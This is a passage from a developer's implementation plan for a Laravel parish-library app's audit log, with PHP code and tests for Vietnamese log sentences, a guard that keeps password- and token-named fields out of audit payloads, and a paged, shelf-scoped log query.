    // BR §9's six words — copy.ts book.condition, duplicated by necessity
    // (see the file docblock) and pinned by parity test.
    'conditions' => [
        'perfect' => 'Nguyên vẹn',
        'slightly_worn' => 'Hơi cũ',
        'worn' => 'Cũ',
        'torn' => 'Rách',
        'missing_pages' => 'Mất trang',
        'written_on' => 'Bị vẽ vào',
    ],
];
```

Two wordings above are this plan's own, not the reference's, because the reference sentence leaned on payload keys our narrowed rows do not hold — named here per the two-ledger discipline: `membership.rejected` interpolates `after.reason` (shipped key: `reason`; the reference's queue-era sentence used the same word), and `credentials.set`'s sentence is the reference's verbatim including the deliberate "đặt hoặc đổi" both-halves rule (BR §2: the log must not understate the act on the one row a manager is held to).

- [ ] **Step 2: Write the failing unit tests**

`tests/Unit/Audit/AuditSentencesTest.php`:

```php
<?php

use App\Support\Audit\AuditSentences;

// Grep first: `grep -rn "^function audFacts" tests/` — top-level helpers
// are process-global (AGENTS.md).
function audFacts(?string $actor = null, ?string $subject = null, ?array $before = null, ?array $after = null): array
{
    return ['actor' => $actor, 'subject' => $subject, 'before' => $before, 'after' => $after];
}

it('renders BR §14\'s shape: actor, đã, phrase', function () {
    $s = AuditSentences::sentence('loan.created', audFacts(
        actor: 'Maria Nguyễn Thị Lan',
        subject: 'Giuse Văn Mượn',   // outside UserFactory's pool on purpose
        after: ['title' => 'Dế Mèn Phiêu Lưu Ký', 'borrower_id' => 'x'],
    ));

    expect($s)->toBe('Maria Nguyễn Thị Lan đã cho Giuse Văn Mượn mượn Dế Mèn Phiêu Lưu Ký');
});

it('a null actor renders as Hệ thống, never as an empty subject', function () {
    expect(AuditSentences::sentence('copy.lost_reported', audFacts()))
        ->toBe('Hệ thống đã báo mất một bản sách');
});

it('an unknown action gets the fallback phrase and NEVER the raw name', function () {
    $s = AuditSentences::sentence('bookshelf.created', audFacts(actor: 'Ai Đó'));
    expect($s)->toBe('Ai Đó đã thực hiện một thao tác hệ thống chưa được mô tả')
        ->and($s)->not->toContain('bookshelf.created');
});

it('a missing subject falls back to "một bạn đọc", a missing title to "một cuốn sách"', function () {
    expect(AuditSentences::sentence('membership.approved', audFacts(actor: 'Maria Q')))
        ->toBe('Maria Q đã duyệt tài khoản của một bạn đọc')
        ->and(AuditSentences::sentence('loan.created', audFacts(actor: 'Maria Q', subject: 'Bé An')))
        ->toBe('Maria Q đã cho Bé An mượn một cuốn sách');
});

it('loan.returned assembles from-clause, condition and title independently', function () {
    expect(AuditSentences::sentence('loan.returned', audFacts(
        actor: 'Maria Q', subject: 'Bé An',
        after: ['title' => 'Hoàng Tử Bé', 'condition' => 'torn'],
    )))->toBe('Maria Q đã nhận trả Hoàng Tử Bé từ Bé An, tình trạng Rách');

    // No subject, unknown condition value: both clauses drop cleanly.
    expect(AuditSentences::sentence('loan.returned', audFacts(
        actor: 'Maria Q', after: ['title' => 'Hoàng Tử Bé', 'condition' => 'shredded'],
    )))->toBe('Maria Q đã nhận trả Hoàng Tử Bé');
});

it('a reason interpolates as " vì …" and is absent when blank or missing', function () {
    expect(AuditSentences::sentence('loan.voided', audFacts(actor: 'Maria Q', after: ['reason' => 'bấm nhầm'])))
        ->toBe('Maria Q đã huỷ một lượt mượn vì bấm nhầm')
        ->and(AuditSentences::sentence('loan.voided', audFacts(actor: 'Maria Q', after: ['reason' => '   '])))
        ->toBe('Maria Q đã huỷ một lượt mượn');
});

it('str() semantics: a non-string payload value is treated as absent, never coerced', function () {
    // The reference's rule: String(false) mid-sentence is worse than a
    // fallback. A boolean title must not render.
    expect(AuditSentences::sentence('book.created', audFacts(actor: 'Maria Q', after: ['title' => false])))
        ->toBe('Maria Q đã thêm sách một cuốn sách');
});

it('groupOf answers the family for the 21 actions and null for a stranger', function () {
    expect(AuditSentences::groupOf('loan.renewed'))->toBe('loans')
        ->and(AuditSentences::groupOf('credentials.set'))->toBe('readers')
        ->and(AuditSentences::groupOf('copy.retired'))->toBe('books')
        ->and(AuditSentences::groupOf('bookshelf.created'))->toBeNull();
});

it('actionsInGroup partitions the whole map with nothing left over', function () {
    $all = array_merge(...array_map(
        fn (string $g) => AuditSentences::actionsInGroup($g),
        ['loans', 'books', 'readers'],
    ));
    expect($all)->toEqualCanonicalizing(array_keys(AuditSentences::ACTIONS))
        ->and(AuditSentences::ACTIONS)->toHaveCount(21);
});

it('payloadRows: em dash for an absent key, the string null for a stored null', function () {
    $rows = AuditSentences::payloadRows(['state' => 'lost'], ['state' => 'available', 'note' => null]);

    expect($rows)->toBe([
        ['field' => 'note', 'before' => '—', 'after' => 'null'],
        ['field' => 'state', 'before' => '"lost"', 'after' => '"available"'],
    ]);
});

it('payloadRows sorts keys and survives null bags', function () {
    expect(AuditSentences::payloadRows(null, null))->toBe([])
        ->and(array_column(AuditSentences::payloadRows(['b' => 1, 'a' => 2], null), 'field'))
        ->toBe(['a', 'b']);
});

it('the condition words match copy.ts character for character', function () {
    // FoldParityTest's cross-language pattern: the client map is read from
    // source text, so the two copies cannot drift silently.
    $ts = file_get_contents(__DIR__.'/../../../resources/js/lib/copy.ts');
    $lang = require __DIR__.'/../../../lang/vi/audit.php';

    foreach ($lang['conditions'] as $key => $word) {
        expect($ts)->toContain("{$key}: \"{$word}\"");
    }
    expect($lang['conditions'])->toHaveCount(6);
});
```

- [ ] **Step 3: Run to verify failure** — `make test FILTER=AuditSentencesTest` → FAIL, class not found.

- [ ] **Step 4: Implement `AuditSentences`**

`app/Support/Audit/AuditSentences.php`:

```php
<?php

declare(strict_types=1);

namespace App\Support\Audit;

/**
 * BR §14's readable sentences, and the closed map of actions this build
 * can describe — 21 entries, one per audit action a shipped command
 * writes (AuditActionCensusTest holds the two sets equal in both
 * directions). Pure: the lang file is loaded by require, so nothing here
 * needs the framework, and the wording ships in lang/vi where server
 * copy lives (spec §7).
 *
 * No branch of sentence() interpolates $action — a raw action name in
 * front of a volunteer is a failure, not a fallback (the reference's
 * §3.1 rule). The stored name belongs to the expansion, where
 * AuditLogQuery places it.
 *
 * The actor's ROLE is deliberately never rendered, although BR §14's
 * example carries one ("Quản lý Maria Lan"): audit_log stores no role,
 * and a manager later made a reader would have every historical sentence
 * relabelled — a claim about authority the log never recorded (the
 * reference's argument, kept).
 */
final class AuditSentences
{
    /** @var array<string, string> action => group ('loans'|'books'|'readers') */
    public const array ACTIONS = [
        'book.created' => 'books',
        'book.updated' => 'books',
        'book.deleted' => 'books',
        'copy.added' => 'books',
        'copy.condition_assessed' => 'books',
        'copy.lost_reported' => 'books',
        'copy.found' => 'books',
        'copy.retired' => 'books',
        'loan.created' => 'loans',
        'loan.returned' => 'loans',
        'loan.renewed' => 'loans',
        'loan.voided' => 'loans',
        'loan.lost' => 'loans',
        'membership.registered' => 'readers',
        'membership.approved' => 'readers',
        'membership.rejected' => 'readers',
        'membership.suspended' => 'readers',
        'membership.reactivated' => 'readers',
        'membership.left' => 'readers',
        'credentials.set' => 'readers',
        'profile.corrected' => 'readers',
    ];

    public const array GROUPS = ['loans', 'books', 'readers'];

    /** @return list<string> */
    public static function actionsInGroup(string $group): array
    {
        return array_values(array_keys(array_filter(self::ACTIONS, fn (string $g) => $g === $group)));
    }

    public static function groupOf(string $action): ?string
    {
        return self::ACTIONS[$action] ?? null;
    }

    /** @param array{actor: ?string, subject: ?string, before: ?array<string, mixed>, after: ?array<string, mixed>} $facts */
    public static function sentence(string $action, array $facts): string
    {
        return strtr(self::line('frame'), [
            ':actor' => $facts['actor'] ?? self::line('system_actor'),
            ':phrase' => self::phrase($action, $facts),
        ]);
    }

    /**
     * The expansion's field/value rows — the stored values rendered as
     * JSON and nothing prettier (BR §14 puts the raw values here; a
     * Vietnamese rendering would be a re-derivation one layer down). An
     * em dash marks a key the bag does not hold AT ALL; the string
     * "null" marks one it holds as null — "not recorded" and "recorded
     * as nothing" are different facts, and an investigation that cannot
     * tell them apart is reading a different log (the reference's
     * measured lesson: its accidental `?? "—"` fallback erased the
     * distinction with every test green).
     *
     * @param  ?array<string, mixed>  $before
     * @param  ?array<string, mixed>  $after
     * @return list<array{field: string, before: string, after: string}>
     */
    public static function payloadRows(?array $before, ?array $after): array
    {
        $keys = array_unique(array_merge(array_keys($before ?? []), array_keys($after ?? [])));
        sort($keys);

        return array_map(fn (string $field) => [
            'field' => $field,
            'before' => self::renderValue($before, $field),
            'after' => self::renderValue($after, $field),
        ], array_values($keys));
    }

    /** @param array{actor: ?string, subject: ?string, before: ?array<string, mixed>, after: ?array<string, mixed>} $facts */
    private static function phrase(string $action, array $facts): string
    {
        $before = $facts['before'];
        $after = $facts['after'];
        $subject = $facts['subject'];

        return match ($action) {
            'book.created' => strtr(self::line('book_created'), [':title' => self::which(self::str($after, 'title'))]),
            'book.updated' => strtr(self::line('book_updated'), [':title' => self::which(self::str($after, 'title'))]),
            'book.deleted' => strtr(self::line('book_deleted'), [':title' => self::which(self::str($before, 'title'))]),
            'copy.added' => ($code = self::str($after, 'code')) !== null
                ? strtr(self::line('copy_added'), [':code' => $code])
                : self::line('copy_added_bare'),
            'copy.condition_assessed' => ($word = self::conditionWord($after)) !== null
                ? strtr(self::line('copy_condition_assessed'), [':condition' => $word])
                : self::line('copy_condition_assessed_bare'),
            'copy.retired' => strtr(self::line('copy_retired'), [':because' => self::because(self::str($after, 'reason'))]),
            'copy.lost_reported' => self::line('copy_lost_reported'),
            'copy.found' => self::line('copy_found'),
            'loan.created' => $subject !== null
                ? strtr(self::line('loan_created'), [':subject' => $subject, ':title' => self::which(self::str($after, 'title'))])
                : strtr(self::line('loan_created_bare'), [':title' => self::which(self::str($after, 'title'))]),
            'loan.returned' => strtr(self::line('loan_returned'), [
                ':title' => self::which(self::str($after, 'title')),
                ':from' => $subject !== null ? strtr(self::line('loan_returned_from'), [':subject' => $subject]) : '',
                ':state' => ($word = self::conditionWord($after)) !== null
                    ? strtr(self::line('loan_returned_state'), [':condition' => $word])
                    : '',
            ]),
            'loan.renewed' => self::line('loan_renewed'),
            'loan.voided' => strtr(self::line('loan_voided'), [':because' => self::because(self::str($after, 'reason'))]),
            'loan.lost' => self::line('loan_lost'),
            'membership.registered' => ($name = self::str($after, 'fullName')) !== null
                ? strtr(self::line('membership_registered'), [':name' => $name])
                : self::line('membership_registered_bare'),
            'membership.approved' => strtr(self::line('membership_approved'), [':subject' => self::who($subject)]),
            'membership.rejected' => strtr(self::line('membership_rejected'), [
                ':subject' => self::who($subject),
                ':because' => self::because(self::str($after, 'reason')),
            ]),
            'membership.suspended' => strtr(self::line('membership_suspended'), [':subject' => self::who($subject)]),
            'membership.reactivated' => strtr(self::line('membership_reactivated'), [':subject' => self::who($subject)]),
            'membership.left' => strtr(self::line('membership_left'), [':subject' => self::who($subject)]),
            'credentials.set' => strtr(self::line('credentials_set'), [':subject' => self::who($subject)]),
            'profile.corrected' => strtr(self::line('profile_corrected'), [':subject' => self::who($subject)]),
            default => self::line('unknown'),
        };
    }

    /**
     * A trimmed, non-empty STRING at $key, or null — never a coerced
     * bool/number (the reference's str()).
     *
     * @param  ?array<string, mixed>  $bag
     */
    private static function str(?array $bag, string $key): ?string
    {
        if ($bag === null || ! array_key_exists($key, $bag) || ! is_string($bag[$key])) {
            return null;
        }
        $trimmed = trim($bag[$key]);

        return $trimmed === '' ? null : $trimmed;
    }

    /** @param ?array<string, mixed> $after */
    private static function conditionWord(?array $after): ?string
    {
        $raw = self::str($after, 'condition');
        /** @var array<string, string> $words */
        $words = self::lines()['conditions'];

        return $raw !== null && array_key_exists($raw, $words) ? $words[$raw] : null;
    }

    private static function because(?string $reason): string
    {
        return $reason === null ? '' : strtr(self::line('because'), [':reason' => $reason]);
    }

    private static function who(?string $subject): string
    {
        return $subject ?? self::line('someone');
    }

    private static function which(?string $title): string
    {
        return $title ?? self::line('some_book');
    }

    /** @param ?array<string, mixed> $bag */
    private static function renderValue(?array $bag, string $field): string
    {
        if ($bag === null || ! array_key_exists($field, $bag)) {
            return '—';
        }

        return (string) json_encode($bag[$field], JSON_UNESCAPED_UNICODE);
    }

    /** @return array<string, mixed> */
    private static function lines(): array
    {
        static $lines = null;

        return $lines ??= require dirname(__DIR__, 3).'/lang/vi/audit.php';
    }

    private static function line(string $key): string
    {
        // The (string) cast is not decoration: lines() is
        // array<string, mixed> (the 'conditions' entry is a nested array),
        // so Larastan level 8 rejects a bare return against a string
        // return type. `make analyse` is run at every commit.
        return (string) self::lines()[$key];
    }
}
```

- [ ] **Step 5: Run the unit tests** — `make test FILTER=AuditSentencesTest` → PASS.

- [ ] **Step 6: Write the census architecture test**

`tests/Feature/Architecture/AuditActionCensusTest.php` — the reference's discovery test, ported. Discovery is over **all of `app/`**, never just `app/Actions/` — the reference found `membership.registered` written by a shared helper outside any commands directory, and this repo's `Registration.php` is exactly that shape:

```php
<?php

use App\Support\Audit\AuditSentences;

it('every audit action written under app/ has a sentence, and every sentence has a writer', function () {
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator(app_path(), FilesystemIterator::SKIP_DOTS)
    );

    $written = [];
    foreach ($files as $file) {
        if (! str_ends_with($file->getPathname(), '.php')) {
            continue;
        }
        // AuditRecorder::record's first argument, as a literal. A dynamic
        // action name would be invisible here — and is therefore banned:
        // if one ever appears, this census is the test to extend, loudly.
        preg_match_all(
            '/->record\(\s*\n?\s*[\'"]([a-z_]+\.[a-z_]+)[\'"]/',
            (string) file_get_contents($file->getPathname()),
            $matches,
        );
        foreach ($matches[1] as $action) {
            $written[$action] = true;
        }
    }

    // Set-equal in BOTH directions: an action with no sentence renders
    // the fallback to a volunteer (a failure, §3.1), and a sentence with
    // no writer is a stale map that looks maintained. A later phase adds
    // its writer and its map entry in the same commit, or this goes red.
    expect(array_keys($written))->toEqualCanonicalizing(array_keys(AuditSentences::ACTIONS));
});
```

Note the regex tolerates the multi-line call shape three Members Actions use (`->record(\n    'membership.registered', …`). Verify against the tree before trusting it: `grep -rn "record($" app/Actions | wc -l` should equal the number of matches the single-line form misses.

- [ ] **Step 7: Run it** — `make test FILTER=AuditActionCensusTest` → PASS (21 = 21). If it fails, the census in this plan's header is wrong — fix the MAP to match the code, never the other way, and correct the header count in the same commit.

- [ ] **Step 8: Lint, analyse, commit** — run `make lint && make analyse`, then commit the four files as `feat: audit sentence layer — 21 shipped actions, server copy, census-pinned`.

---

### Task 2: `AuditSecrets` — the forbidden-field walk, wired into `AuditRecorder`

Read first: `old_next/src/domain/kernel/audit.ts` lines 60–206 — the FORBIDDEN list (with the live-audit provenance of `key`, `salt`, `otp`), the allowed-suffix carve-outs, and the nested-payload lesson (`after: { credentials: { password_hash } }` reached the log under a top-level-only guard).

**Files:**
- Create: `app/Support/Audit/AuditSecrets.php`
- Modify: `app/Support/AuditRecorder.php` (guard before the insert)
- Modify: `lang/vi/rules.php` (append `audit_forbidden_field`)
- Modify: `tests/Unit/Catalogue/RuleViolatedCodesHaveSentencesTest.php` (census + `audit_forbidden_field`)
- Test: `tests/Unit/Audit/AuditSecretsTest.php`

**Interfaces:**
- Consumes: `App\Exceptions\RuleViolated` (Phase 1a).
- Produces: `AuditSecrets::assertNoSecrets(?array $before, ?array $after): void` — throws `RuleViolated('audit_forbidden_field')`; called by `AuditRecorder::record` for every command in the system from this commit on.

- [ ] **Step 1: Write the failing unit tests**

`tests/Unit/Audit/AuditSecretsTest.php`:

```php
<?php

use App\Exceptions\RuleViolated;
use App\Support\Audit\AuditSecrets;

it('refuses every forbidden token, as a whole word inside a snake_case or camelCase key', function () {
    foreach (['password', 'password_hash', 'passwordHash', 'pwd', 'token', 'session_id',
        'secret', 'mat_khau', 'api_key', 'salt', 'otp', 'reset_token'] as $key) {
        expect(fn () => AuditSecrets::assertNoSecrets(null, [$key => 'x']))
            ->toThrow(RuleViolated::class);
    }
});

it('matches whole tokens only: avatar_object, monkey, keyboard all pass', function () {
    // 'key' as a token is forbidden; 'monkey'/'keyboard' contain it as a
    // substring and must pass — DATABASE.md records avatar_object being
    // NAMED to dodge exactly this list, so the port must split tokens the
    // same way.
    AuditSecrets::assertNoSecrets(['avatar_object' => null], ['monkey' => 1, 'keyboard' => 'qwerty']);
    expect(true)->toBeTrue();
});

it('allows the sanctioned metadata suffixes about a secret', function () {
    AuditSecrets::assertNoSecrets(null, [
        'password_changed_at' => '2026-08-29T00:00:00Z',
        'password_set_at' => '2026-08-29T00:00:00Z',
        'has_password' => true,
        'session_count' => 2,
    ]);
    expect(true)->toBeTrue();
});

it('walks nested objects and arrays — the reference\'s measured bypass', function () {
    expect(fn () => AuditSecrets::assertNoSecrets(null, ['credentials' => ['password_hash' => 'x']]))
        ->toThrow(RuleViolated::class)
        ->and(fn () => AuditSecrets::assertNoSecrets(null, ['changes' => [['password_hash' => 'x']]]))
        ->toThrow(RuleViolated::class)
        // A real PHP object, not an array: record() takes array<string,
        // mixed>, so a stdClass VALUE is legal and json_encodes with its
        // property names. An is_array-only walk misses it silently.
        ->and(fn () => AuditSecrets::assertNoSecrets(null, ['credentials' => (object) ['password_hash' => 'x']]))
        ->toThrow(RuleViolated::class);
});

it('names the two things it deliberately does not check', function () {
    // KEYS, not values: a secret pasted into an innocuous key is invisible
    // here and stays a code-review matter (the reference's own bound).
    AuditSecrets::assertNoSecrets(null, ['note' => 'mat-khau-123']);
    // And `context`, which AuditRecorder writes as [] on every path today,
    // is not walked — assertNoSecrets takes before/after only. The day a
    // command puts anything in context, this guard must grow a third
    // argument; recorded in known-gaps (Task 10) so it is an addition,
    // not a rediscovery.
    expect(true)->toBeTrue();
});

it('every payload shape the 21 shipped writers produce passes', function () {
    // The exact key sets grepped from app/Actions at plan time. If a
    // command's payload changes, this list changes with it — that is the
    // point: the guard must never brick a shipped command. (The full
    // suite re-proves this end-to-end in Step 4, through the writers
    // themselves.)
    $shapes = [
        ['title', 'slug', 'author', 'category', 'isbn', 'isPublished', 'copyCodes'],
        ['code', 'bookId', 'state', 'acquiredOn', 'acquiredFrom', 'acquiredFromMembershipId'],
        ['condition', 'conditionNote'],
        ['state', 'reason'], ['state', 'note'],
        ['deletedAt', 'copiesDeleted', 'copiesRetained'],
        ['copy_state', 'borrower_id', 'membership_id', 'due_on', 'title', 'request_id'],
        ['status', 'copy_state', 'condition', 'title', 'borrower_id'],
        ['due_on', 'renewals_used'],
        ['status', 'copy_state', 'reason'], ['status'],
        ['userId', 'fullName', 'status', 'parishUnitL1Id', 'parishUnitL2Id'],
        ['saint_name', 'full_name', 'date_of_birth', 'father_name', 'mother_name',
            'phone', 'phone_missing_reason', 'email', 'avatar_object'],
    ];
    foreach ($shapes as $keys) {
        AuditSecrets::assertNoSecrets(null, array_fill_keys($keys, 'v'));
    }
    expect(true)->toBeTrue();
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=AuditSecretsTest` → FAIL.

- [ ] **Step 3: Implement**

`app/Support/Audit/AuditSecrets.php`:

```php
<?php

declare(strict_types=1);

namespace App\Support\Audit;

use App\Exceptions\RuleViolated;

/**
 * BR §14: "Passwords and session tokens are never captured." The
 * reference enforced it as a walk over every payload before insert
 * (old_next/src/domain/kernel/audit.ts) after a live audit found three
 * gaps its first list missed (api_key-shaped columns, salt, otp); this
 * is that walk, ported the day the log becomes a rendered and exported
 * surface. Tokens are matched whole within snake/camel splits — 'key'
 * catches api_key and never monkey; DATABASE.md records avatar_object
 * being NAMED around this exact list.
 *
 * The refusal deliberately names neither the field nor the value: the
 * point is that neither belongs anywhere a log line might surface it.
 */
final class AuditSecrets
{
    private const array FORBIDDEN = [
        'password', 'hash', 'pwd', 'token', 'session', 'secret',
        'khau', 'key', 'salt', 'otp',
        // 'khau': mat_khau splits to [mat, khau]; 'mat' alone is too
        // common a Vietnamese syllable to forbid, 'khau' in a column name
        // occurs only in mat_khau. The reference matched the joined form;
        // token-splitting here needs the second half.
    ];

    /** Metadata ABOUT a secret, never the secret — BR §2's own permitted record shape. */
    private const array ALLOWED = [
        'password_changed_at', 'password_set_at', 'has_password', 'session_count',
    ];

    /**
     * @param  ?array<string, mixed>  $before
     * @param  ?array<string, mixed>  $after
     */
    public static function assertNoSecrets(?array $before, ?array $after): void
    {
        foreach ([$before, $after] as $bag) {
            if ($bag !== null) {
                self::walk($bag, 0);
            }
        }
    }

    /** @param array<array-key, mixed> $bag */
    private static function walk(array $bag, int $depth): void
    {
        if ($depth > 6) {
            return; // a payload this deep is not a diff; nothing shipped nests past 2
        }
        foreach ($bag as $key => $value) {
            if (is_string($key) && self::isForbiddenKey($key)) {
                throw new RuleViolated('audit_forbidden_field');
            }
            // Arrays AND objects: record()'s signature is
            // array<string, mixed>, so a VALUE may be a stdClass or any
            // other object, and it is json_encoded into the payload with
            // its property names intact — an is_array-only walk would let
            // (object) ['password_hash' => …] straight through, which is
            // the reference's nested-bypass lesson wearing a different hat.
            if (is_object($value)) {
                $value = get_object_vars($value);
            }
            if (is_array($value)) {
                self::walk($value, $depth + 1);
            }
        }
    }

    private static function isForbiddenKey(string $key): bool
    {
        if (in_array(strtolower($key), self::ALLOWED, true)) {
            return false;
        }
        // snake_case and camelCase both split to whole tokens: api_key →
        // [api, key]; passwordHash → [password, hash]; monkey → [monkey].
        $tokens = preg_split('/[_\W]+|(?<=[a-z0-9])(?=[A-Z])/', $key, -1, PREG_SPLIT_NO_EMPTY) ?: [];

        return array_intersect(array_map(strtolower(...), $tokens), self::FORBIDDEN) !== [];
    }
}
```

In `app/Support/AuditRecorder.php`, add the guard as the first statement of `record()` (before the tenant check — a forbidden field is wrong regardless of binding), plus the import:

```php
use App\Support\Audit\AuditSecrets;
// …
    public function record(string $action, string $entityType, ?string $entityId, ?array $before, ?array $after): void
    {
        AuditSecrets::assertNoSecrets($before, $after);

        $bookshelfId = $this->context->bookshelfId();
        // … (unchanged)
```

Append to `lang/vi/rules.php` (after the 1c block — never rewrite earlier blocks):

```php
    // ── Oversight (Phase 1d) ──────────────────────────────────────────
    // Authored by this plan, not OPS (the member_has_active_loans
    // precedent): the code guards a programming error, so the sentence
    // tells the volunteer the one thing they can do about it.
    'audit_forbidden_field' => 'Không thể ghi nhật ký cho thao tác này. Vui lòng báo quản trị viên.',
```

Add `'audit_forbidden_field'` to `RuleViolatedCodesHaveSentencesTest`'s `toEqualCanonicalizing` list — the throw above uses the short, imported form, so the census regex sees it.

- [ ] **Step 4: Run** — `make test FILTER="AuditSecretsTest|RuleViolatedCodesHaveSentencesTest"` → PASS. Then the **full** suite (`make test`): every 1a–1c command test now runs through the guard and must stay green — that full-suite pass IS this task's proof that no shipped payload trips it.

- [ ] **Step 5: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: forbidden-field guard on every audit write`.

---

### Task 3: `AuditLogQuery` — the shelf's trail, sentence-ready, filtered, paged

Read first: `old_next/src/domain/shelf/queries/get-audit-log.ts` **whole** — every design decision below ports one of its docstring arguments (the id tiebreak, the no-`deleted_at` rule, the actor filter that narrows and never widens, the civil-day date bounds, why unpaged is not an option for the one table with no size ceiling). Then `tests/Feature/Architecture/TenancyArchitectureTest.php` lines 80–110 (the tripwire this task amends).

**Files:**
- Create: `app/Queries/AuditLogQuery.php`
- Modify: `tests/Feature/Architecture/TenancyArchitectureTest.php` (the `$allowed` list — divergence 10)
- Test: `tests/Feature/Oversight/AuditLogQueryTest.php`

**Interfaces:**
- Consumes: `AuditSentences::{sentence, payloadRows, groupOf, actionsInGroup}` (Task 1), `App\Models\AuditLog`, `App\Support\TenantContext` (`bookshelfId(): ?string`).
- Produces (Task 4's controller calls these exactly):
  - `AuditLogQuery::run(?string $actorId = null, ?string $group = null, ?string $from = null, ?string $to = null, int $page = 1): array` returning `array{rows: list<array{id: string, action: string, entityType: string, entityId: ?string, occurredAt: string, group: ?string, sentence: string, expansion: list<array{field: string, before: string, after: string}>}>, page: int, pageCount: int, total: int}`. `$from`/`$to` are validated `Y-m-d` civil dates in `Asia/Ho_Chi_Minh`, inclusive; `$actorId` a validated UUID; `$group` a validated group key. **Validation is the controller's** — this class trusts its inputs' shape (they never come from a request directly).
  - `AuditLogQuery::actors(): list<array{userId: string, name: string, entries: int}>` — everybody who has written an entry on this shelf, most active first (BR §14's "what has manager A been doing" as a control rather than a uuid a volunteer would have to know; a list of managers would be wrong twice — readers write entries in later phases, and a manager who has done nothing would filter to an empty page that looks like a bug).

- [ ] **Step 1: Amend the tenancy tripwire FIRST, with the justification in the test**

In `TenancyArchitectureTest.php`, extend `$allowed`:

```php
    $allowed = [
        'app/Models/Scopes/BookshelfScope.php',
        'app/Http/Middleware/ResolveTenant.php',   // the population step itself (Task 16)
        // Phase 1d: AuditLog is one of the two models this file pins as
        // EXEMPT from BelongsToBookshelf (nullable bookshelf_id — global
        // rows exist), so no scope filters it and its one read query must
        // write the where itself. The isolation property this grep can no
        // longer guarantee for that file moves to
        // tests/Feature/Oversight/AuditLogQueryTest.php's two-shelf-plus-
        // global-row test, which proves it by identity, not by convention.
        'app/Queries/AuditLogQuery.php',
    ];
```

Run `make test FILTER=TenancyArchitectureTest` → still PASS (the new entry is inert until the file exists).

- [ ] **Step 2: Write the failing feature tests**

`tests/Feature/Oversight/AuditLogQueryTest.php`:

```php
<?php

use App\Models\AuditLog;
use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Queries\AuditLogQuery;
use App\Support\TenantContext;

/**
 * Two shelves with DISTINGUISHABLE audit histories plus one global
 * (null-bookshelf_id) row — a one-row-per-shelf fixture cannot tell
 * "scoped to this shelf" from "scoped to everything" (1c's measured
 * fixture-shape lesson). Rows are inserted with EXPLICIT occurred_at
 * values in an order that differs from every asserted order, because
 * audit_log.id is a monotonic BIGINT and an unordered scan returns
 * creation order (the five-times-fired trap, in its bigint costume).
 *
 * Grep first: `grep -rn "^function alogFix" tests/`.
 */
function alogFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-alog', 'settings' => []]);
    $other = Bookshelf::factory()->create(['slug' => 'can-tho-alog', 'settings' => []]);

    $maria = User::factory()->create(['full_name' => 'Maria Quản Lý Nhật Ký']);
    $mariaMembership = Membership::factory()->for($shelf)->create([
        'user_id' => $maria->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $child = User::factory()->create(['full_name' => 'Giuse Bé Đọc Sách']);
    $childMembership = Membership::factory()->for($shelf)->create([
        'user_id' => $child->id, 'role' => 'reader', 'status' => 'active',
    ]);

    $row = fn (array $overrides) => AuditLog::query()->create(array_merge([
        'bookshelf_id' => $shelf->id, 'actor_id' => $maria->id,
        'action' => 'copy.lost_reported', 'entity_type' => 'copy', 'entity_id' => null,
        'before' => null, 'after' => null, 'context' => [],
    ], $overrides));

    // Seeded MIDDLE, NEWEST, OLDEST — creation order differs from
    // occurred_at desc. The two 10:00:00 rows tie on the timestamp so the
    // id-desc tiebreak is falsifiable (AddCopies' one-instant burst is the
    // ordinary case, not the corner).
    $middle = $row(['action' => 'loan.created', 'entity_type' => 'loan',
        'after' => ['title' => 'Dế Mèn Phiêu Lưu Ký', 'borrower_id' => $child->id],
        'occurred_at' => '2026-08-10 10:00:00']);
    $tieLate = $row(['action' => 'copy.added', 'after' => ['code' => 'DT-0201'],
        'occurred_at' => '2026-08-10 10:00:00']);
    $newest = $row(['action' => 'membership.approved', 'entity_type' => 'membership',
        'entity_id' => $childMembership->id, 'occurred_at' => '2026-08-11 09:00:00']);
    $oldest = $row(['action' => 'credentials.set', 'entity_type' => 'user',
        'entity_id' => $child->id, 'occurred_at' => '2026-08-01 02:00:00']);

    // Foreign and global rows: both must be invisible to this shelf.
    $foreignActor = User::factory()->create(['full_name' => 'Anna Tủ Khác']);
    AuditLog::query()->create([
        'bookshelf_id' => $other->id, 'actor_id' => $foreignActor->id,
        'action' => 'book.created', 'entity_type' => 'book', 'entity_id' => null,
        'before' => null, 'after' => ['title' => 'Sách Của Tủ Khác'], 'context' => [],
        'occurred_at' => '2026-08-10 12:00:00',
    ]);
    AuditLog::query()->create([
        'bookshelf_id' => null, 'actor_id' => null,
        'action' => 'bookshelf.created', 'entity_type' => 'bookshelf', 'entity_id' => null,
        'before' => null, 'after' => ['name' => 'Tủ Toàn Cục'], 'context' => [],
        'occurred_at' => '2026-08-10 12:00:00',
    ]);

    app(TenantContext::class)->set($shelf, $mariaMembership);
    test()->actingAs($maria);

    return compact('shelf', 'other', 'maria', 'mariaMembership', 'child', 'childMembership',
        'middle', 'tieLate', 'newest', 'oldest', 'foreignActor');
}

it('orders occurred_at desc then id desc, proven on a tie seeded out of order', function () {
    $f = alogFix();

    $ids = collect(app(AuditLogQuery::class)->run()['rows'])->pluck('id')->all();

    expect($ids)->toBe([
        (string) $f['newest']->id,
        (string) $f['tieLate']->id,   // same instant as middle; larger id wins
        (string) $f['middle']->id,
        (string) $f['oldest']->id,
    ]);
});

it('pages a one-instant burst without repeating or skipping a row', function () {
    // The tie assertion above is WEAK on its own and must not be the only
    // pin: with `order by occurred_at desc` alone MariaDB can walk
    // audit_log_shelf (bookshelf_id, occurred_at) backwards and hand back
    // ties in descending PK order anyway — the same answer the id key
    // produces, for a reason the query does not own. What the second sort
    // key actually buys is a TOTAL order across a limit/offset boundary,
    // so pin that instead: 30 rows sharing one occurred_at, paged, must
    // union to 30 distinct ids.
    $f = alogFix();
    foreach (range(1, 30) as $i) {
        AuditLog::query()->create([
            'bookshelf_id' => $f['shelf']->id, 'actor_id' => $f['maria']->id,
            'action' => 'copy.added', 'entity_type' => 'copy', 'entity_id' => null,
            'before' => null, 'after' => ['code' => sprintf('DT-8%03d', $i)], 'context' => [],
            'occurred_at' => '2026-08-15 08:00:00',   // ONE instant, 30 rows
        ]);
    }

    $q = app(AuditLogQuery::class);
    $seen = array_merge(
        collect($q->run(page: 1)['rows'])->pluck('id')->all(),
